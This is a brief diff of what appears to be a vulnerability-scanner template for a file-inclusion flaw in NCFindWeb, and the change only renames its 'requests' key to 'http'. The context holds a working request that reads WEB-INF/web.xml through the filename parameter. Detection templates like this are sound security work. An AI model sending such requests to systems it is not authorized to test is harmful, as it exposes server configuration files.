@@ -7,7 +7,7 @@ info:
   reference: https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html
   tags: seeyon,wooyun,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
